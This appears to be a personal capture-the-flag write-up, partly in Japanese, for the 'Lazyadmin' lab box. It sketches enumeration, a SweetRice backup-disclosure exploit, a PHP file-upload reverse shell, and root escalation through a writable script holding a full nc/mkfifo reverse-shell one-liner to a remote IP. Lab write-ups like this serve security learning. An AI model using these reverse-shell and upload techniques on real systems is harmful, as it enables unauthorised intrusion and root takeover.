---
title: "Lazyadmin"
date: 2024-03-16T11:11:11+09:00
draft: false
---

### enum

- nmap
  - 22:ssh
  - 80:http
- gobuster
  - content

### user.txt

- ```searchsploit sweetrice```
- ```cat /usr/share/exploitdb/exploits/php/webapps/40718.txt```

``` txt
You can access to all mysql backup and download them from this directory.
http://localhost/inc/mysql_backup

and can access to website files backup from:
http://localhost/SweetRice-transfer.zip
```

- mysql のバックアップ？に接続できるらしい
  - ```http://10.10.61.5/content/inc/mysql_backup/```
- manager とパスワードのハッシュが見つかる
- Arbitary file upload みたいなのを実行する
- ```http://10.10.61.5/content/attachment/./shell.php5``` に php  が出てくるのでアクセスするとリバースシェルを獲得できる

### root.txt

- ```sudo -l```

``` shell
$ sudo -l
Matching Defaults entries for www-data on THM-Chal:
env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
(ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```

``` shell
$ cat backup.pl
#!/usr/bin/perl

system("sh", "/etc/copy.sh");

$ ls -la
rw-r--r-x 1 root root 47 Nov 29 2019 backup.pl

$ ls -la /etc/copy.sh
-rw-r--rwx 1 root root 81 Nov 29  2019 /etc/copy.sh

$ cat /etc/copy.sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
```

- copy.sh はユーザで書き換え可能なので (rwx) root で実行されているリバースシェルを書きかえればいい
